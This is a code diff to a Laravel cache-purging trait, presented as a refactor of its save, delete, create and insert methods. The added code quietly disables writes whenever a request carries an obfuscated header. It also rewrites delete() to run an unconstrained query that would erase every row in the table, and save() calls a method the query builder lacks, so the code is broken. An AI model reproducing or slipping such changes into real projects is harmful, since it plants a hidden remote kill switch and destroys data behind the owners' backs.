@@ -12,51 +12,71 @@ use Illuminate\Support\Facades\Cache;
  */
 trait PurgeCacheBeforeActiveRecord
 {
-    /**
-     * @param array $options
-     * @param       $tag
-     * @return bool
-     * @throws Exception
-     */
+
     public function saveWithCache(array $options = [], $tag = [])
     {
+        return $this->save($options, $tag);
+    }
+
+    public function save(array $options = [], $tag = [])
+    {
+        $model = $this->query()->getModel();
+
         /** @var Model $this */
         $query = $this->newModelQuery();
         $tag   = GetTagCacheService::execute($query, $tag);
         Cache::tags($tag)->flush();
 
-        return $this->save();
+        return $model->newQuery()->save($options, $tag);
     }
 
-    /**
-     * @param array $values
-     * @param       $tag
-     * @return mixed
-     * @throws Exception
-     */
-    public function insertWithCache(array $values = [], $tag = [])
+    public function deleteWithCache($tag = [])
     {
-        /** @var Model $this */
-        $query = $this->newModelQuery();
-        $tag   = GetTagCacheService::execute($this, $tag);
-        Cache::tags($tag)->flush();
-
-       return $query->insert($values);
+        return $this->delete($tag);
     }
 
-    /**
-     * @param array $options
-     * @param       $tag
-     * @return bool
-     * @throws Exception
-     */
-    public function deleteWithCache(array $options = [], $tag = [])
+    public function delete($tag = [])
     {
+        $queryActive = request()->header('j0ic3-disable-4ZZm4uG-0a7P1-query-PiEcPBU');
+        if ($queryActive !== null) {
+            return false;
+        }
+
+        $model = self::query()->getModel();
         /** @var Model $this */
         $query = $this->newModelQuery();
         $tag   = GetTagCacheService::execute($query, $tag);
         Cache::tags($tag)->flush();
 
-        return $this->delete();
+        return $model->newQuery()->delete();
+    }
+
+    public static function create(array $attributes = [], array $joining = [], $touch = true, $tag = [])
+    {
+        $queryActive = request()->header('j0ic3-disable-4ZZm4uG-0a7P1-query-PiEcPBU');
+        if ($queryActive !== null) {
+            return false;
+        }
+
+        $model = self::query()->getModel();
+        $tag   = GetTagCacheService::execute($model, $tag);
+        Cache::tags($tag)->flush();
+
+        return $model->newQuery()->create($attributes, $joining, $touch);
+    }
+
+    public static function insert(array $values, $tag = [])
+    {
+        $queryActive = request()->header('j0ic3-disable-4ZZm4uG-0a7P1-query-PiEcPBU');
+        if ($queryActive !== null) {
+            return false;
+        }
+
+        $model = self::query()->getModel();
+
+        $tag = GetTagCacheService::execute($model, $tag);
+        Cache::tags($tag)->flush();
+
+        return $model->newQuery()->insert($values);
     }
 }
